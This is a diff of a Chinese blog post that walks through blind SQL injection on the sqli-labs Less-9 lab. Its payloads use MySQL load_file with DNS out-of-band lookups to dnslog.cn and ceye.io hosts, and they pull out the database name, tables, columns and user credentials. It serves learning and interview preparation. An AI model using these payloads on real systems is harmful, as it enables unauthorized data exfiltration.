@@ -1,9 +1,9 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>盲注快速获取数据 | Don_Joshua's Blog</title><meta name="author" content="Don Joshua"><meta name="copyright" content="Don Joshua"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前段时间参加面试，面试官有问过一个问题，SQL注入中盲注如何快速获取数据。当时没有反应过来，后来百度了才发现，这不就是盲注使用dnslog外带数据么，尘封的记忆一下子就回想起来了，那是一个月黑风高的夜晚……咳咳，扯远了，总之就是没答上来，复盘吧！ 环境复现我们使用sql-labs进行还原盲注的情形，就用Less-9吧  可以看到经过简单的注入点测试，发现页面上的东西不会发生改变  但是当paylo">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>盲注快速获取数据 | Don_Joshua's Blog</title><meta name="author" content="Don Joshua"><meta name="copyright" content="Don Joshua"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前段时间参加面试，面试官有问过一个问题，SQL注入中盲注如何快速获取数据。当时没有反应过来，后来百度了才发现，这不就是盲注使用dnslog外带数据么，尘封的记忆一下子就回想起来了，那是一个月黑风高的夜晚……咳咳，扯远了，总之就是没答上来，复盘吧！ 环境复现 我们使用sql-labs进行还原盲注的情形，就用Less-9吧  可以看到经过简单的注入点测试，发现页面上的东西不会发生改变  但是当payl">
 <meta property="og:type" content="article">
 <meta property="og:title" content="盲注快速获取数据">
 <meta property="og:url" content="http://example.com/2023/04/15/%E7%9B%B2%E6%B3%A8%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/index.html">
 <meta property="og:site_name" content="Don_Joshua&#39;s Blog">
-<meta property="og:description" content="前段时间参加面试，面试官有问过一个问题，SQL注入中盲注如何快速获取数据。当时没有反应过来，后来百度了才发现，这不就是盲注使用dnslog外带数据么，尘封的记忆一下子就回想起来了，那是一个月黑风高的夜晚……咳咳，扯远了，总之就是没答上来，复盘吧！ 环境复现我们使用sql-labs进行还原盲注的情形，就用Less-9吧  可以看到经过简单的注入点测试，发现页面上的东西不会发生改变  但是当paylo">
+<meta property="og:description" content="前段时间参加面试，面试官有问过一个问题，SQL注入中盲注如何快速获取数据。当时没有反应过来，后来百度了才发现，这不就是盲注使用dnslog外带数据么，尘封的记忆一下子就回想起来了，那是一个月黑风高的夜晚……咳咳，扯远了，总之就是没答上来，复盘吧！ 环境复现 我们使用sql-labs进行还原盲注的情形，就用Less-9吧  可以看到经过简单的注入点测试，发现页面上的东西不会发生改变  但是当payl">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/avatar.jpg">
 <meta property="article:published_time" content="2023-04-15T11:30:47.000Z">
@@ -155,8 +155,30 @@
       }
     }
     detectApple()
-    })(window)</script><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/mystyle.css"><link rel="stylesheet" href="/css/textStyle.css"><link rel="stylesheet" href="/css_layout/calendar.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-jiarufangjian-01"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-shijian"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei2"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-biaoqiankuozhan_xiuxian-214"></i><span> 休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/game/"><i class="fa-fw iconfont icon-youxi"></i><span> 游戏</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-dianying"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-iconzhengli"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a id="site-name" href="/">Don_Joshua's Blog</a></span><div id="menus"></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-jiarufangjian-01"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-shijian"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei2"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-biaoqiankuozhan_xiuxian-214"></i><span> 休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/game/"><i class="fa-fw iconfont icon-youxi"></i><span> 游戏</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-dianying"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-iconzhengli"></i><span> 关于</span></a></div></div><center id="name-container"><a id="page-name" href="javascript:scrollToTop()">PAGE_NAME</a></center><div id="nav-right"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">盲注快速获取数据</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-15T11:30:47.000Z" title="发表于 2023-04-15 19:30:47">2023-04-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-24T09:01:51.023Z" title="更新于 2023-04-24 17:01:51">2023-04-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">611</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>2分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="盲注快速获取数据"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>前段时间参加面试，面试官有问过一个问题，SQL注入中盲注如何快速获取数据。当时没有反应过来，后来百度了才发现，这不就是盲注使用dnslog外带数据么，尘封的记忆一下子就回想起来了，那是一个月黑风高的夜晚……咳咳，扯远了，总之就是没答上来，复盘吧！</p>
-<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>我们使用sql-labs进行还原盲注的情形，就用Less-9吧</p>
+    })(window)</script><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/mystyle.css"><link rel="stylesheet" href="/css/textStyle.css"><link rel="stylesheet" href="/css_layout/calendar.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-jiarufangjian-01"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-shijian"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei2"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-biaoqiankuozhan_xiuxian-214"></i><span> 休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/game/"><i class="fa-fw iconfont icon-youxi"></i><span> 游戏</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-dianying"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-iconzhengli"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent">nav#nav
+  span#blog-info
+    a(href=url_for('/') title=config.title)
+      if theme.nav.logo
+        img.site-icon(src=url_for(theme.nav.logo))
+      if theme.nav.display_title
+        span.site-name=config.title
+    
+  #menus
+    if (theme.algolia_search.enable || theme.local_search.enable)
+      #search-button
+        a.site-page.social-icon.search(href="javascript:void(0);")
+          i.fas.fa-search.fa-fw
+          span=' '+_p('search.title')
+    !=partial('includes/header/menu_item', {}, {cache: true})
+
+    #toggle-menu
+      a.site-page(href="javascript:void(0);")
+        i.fas.fa-bars.fa-fw
+
+
+<div id="post-info"><h1 class="post-title">盲注快速获取数据</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-15T11:30:47.000Z" title="发表于 2023-04-15 19:30:47">2023-04-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-24T09:01:51.023Z" title="更新于 2023-04-24 17:01:51">2023-04-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">584</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>2分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="盲注快速获取数据"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>前段时间参加面试，面试官有问过一个问题，SQL注入中盲注如何快速获取数据。当时没有反应过来，后来百度了才发现，这不就是盲注使用dnslog外带数据么，尘封的记忆一下子就回想起来了，那是一个月黑风高的夜晚……咳咳，扯远了，总之就是没答上来，复盘吧！</p>
+<h2 id="环境复现">环境复现</h2>
+<p>我们使用sql-labs进行还原盲注的情形，就用Less-9吧</p>
 <p><img src="image-20230415195258997.png" alt="image-20230415195258997"></p>
 <p>可以看到经过简单的注入点测试，发现页面上的东西不会发生改变</p>
 <p><img src="image-20230415195831443.png" alt="image-20230415195831443"></p>
@@ -166,36 +188,38 @@
 <p>或者是其他dns平台，比如<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">dnslog</a></p>
 <p>这两个这里都会演示一下</p>
 <p><img src="image-20230415201655811.png" alt="image-20230415201655811"></p>
-<h2 id="dnslog外带条件"><a href="#dnslog外带条件" class="headerlink" title="dnslog外带条件"></a>dnslog外带条件</h2><p>要使用dnslog外带首先需要满足几个条件：</p>
+<h2 id="dnslog外带条件">dnslog外带条件</h2>
+<p>要使用dnslog外带首先需要满足几个条件：</p>
 <p>1.首先要将secure_file_priv改为‘’</p>
 <p><img src="image-20230417111707360.png" alt="image-20230417111707360"></p>
 <blockquote>
-<p>​    修改步骤：1.使用show variables like ‘%secure%’</p>
-<p>​                        2.进入MYSQL文件夹下，打开my.ini文件</p>
-<p>​                        3.在my.ini中，添加或修改为secure_file_priv=””</p>
+<p>​	修改步骤：1.使用show variables like ‘%secure%’</p>
+<p>​						2.进入MYSQL文件夹下，打开my.ini文件</p>
+<p>​						3.在my.ini中，添加或修改为secure_file_priv=“”</p>
 </blockquote>
 <p><img src="image-20230417112144072.png" alt="修改后的secure_file_priv"></p>
 <p>2，只适用于Windows系统</p>
-<h2 id="DNS外带实践"><a href="#DNS外带实践" class="headerlink" title="DNS外带实践"></a>DNS外带实践</h2><p><code>payload：?id=1&#39;  and sleep(5) order by 3--+</code></p>
+<h2 id="DNS外带实践">DNS外带实践</h2>
+<p><code>payload：?id=1'  and sleep(5) order by 3--+</code></p>
 <p>判断字段数，在order by 3时会sleep的，order by 4 时并不会sleep</p>
 <p><img src="image-20230415202943458.png" alt="image-20230415202943458"></p>
 <p>测试出查询字段数为3</p>
-<p><code>payload：?id=1&#39;  and sleep(5) union select 1,2,3--+</code></p>
+<p><code>payload：?id=1'  and sleep(5) union select 1,2,3--+</code></p>
 <p><img src="image-20230415203036163.png" alt="image-20230415203036163"></p>
 <p>测试是否支持dns外带，使用的ceye给的dns地址</p>
-<p><code>payload：/?id=1&#39; and load_file(&#39;\\\\nihao.xxxx.ceye.io\\abc&#39;) --+</code></p>
+<p><code>payload：/?id=1' and load_file('\\\\nihao.xxxx.ceye.io\\abc') --+</code></p>
 <p><img src="image-20230417113400272.png" alt="image-20230417113400272"></p>
 <p>外带成功：</p>
 <p><img src="image-20230417113527467.png" alt="image-20230417113527467"></p>
-<p><strong><em>（ps：后面就是用dnslog平台来进行演示了）</em></strong></p>
+<p><em><strong>（ps：后面就是用dnslog平台来进行演示了）</strong></em></p>
 <p>获取一个域名先</p>
 <p><img src="image-20230417143912645.png" alt="image-20230417143912645"></p>
-<p><code>payload：?id=1&#39; and load_file(concat(&#39;\\\\&#39;,database(),&#39;.fh0qvo.dnslog.cn\\abc&#39;)) --+</code></p>
+<p><code>payload：?id=1' and load_file(concat('\\\\',database(),'.fh0qvo.dnslog.cn\\abc')) --+</code></p>
 <p>外带数据库名称</p>
 <p><img src="image-20230417114432264.png" alt="image-20230417114432264"></p>
 <p>在dnslog平台得到数据库名称security：</p>
 <p><img src="image-20230417114711489.png" alt="image-20230417114711489"></p>
-<p><code>payload：?id=1&#39; and load_file(concat(&#39;\\\\&#39;,(select concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),&#39;.dxllqa.dnslog.cn\\abc&#39;)) --+</code></p>
+<p><code>payload：?id=1' and load_file(concat('\\\\',(select concat(table_name) from information_schema.tables where table_schema='security' limit 0,1),'.dxllqa.dnslog.cn\\abc')) --+</code></p>
 <p>爆破表名</p>
 <p><img src="image-20230417145128446.png" alt="image-20230417145128446"></p>
 <p>通过改变limit后的数字得到所有的表名</p>
@@ -207,11 +231,11 @@
 <p><img src="image-20230417145434505.png" alt="image-20230417145434505"></p>
 <p>……</p>
 <p><img src="image-20230417145511479.png" alt="image-20230417145511479"></p>
-<p><code>payload：?id=1&#39; and load_file(concat(&#39;\\\\&#39;,(select concat(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 0,1),&#39;.dxllqa.dnslog.cn\\abc&#39;)) --+</code></p>
+<p><code>payload：?id=1' and load_file(concat('\\\\',(select concat(column_name) from information_schema.columns where table_name='users' limit 0,1),'.dxllqa.dnslog.cn\\abc')) --+</code></p>
 <p>爆破字段名</p>
 <p><img src="image-20230417145650444.png" alt="image-20230417145650444"></p>
 <p><img src="image-20230417145602648.png" alt="image-20230417145602648"></p>
-<p><code>payload：?id=1&#39; and load_file(concat(&#39;\\\\&#39;,(select concat(username,password) from users limit 0,1),&#39;.dxllqa.dnslog.cn\\abc&#39;)) --+</code></p>
+<p><code>payload：?id=1' and load_file(concat('\\\\',(select concat(username,password) from users limit 0,1),'.dxllqa.dnslog.cn\\abc')) --+</code></p>
 <p>爆破用户名和密码</p>
 <p><img src="image-20230417150509236.png" alt="image-20230417150509236"></p>
 <p><img src="image-20230417150347739.png" alt="image-20230417150347739"></p>
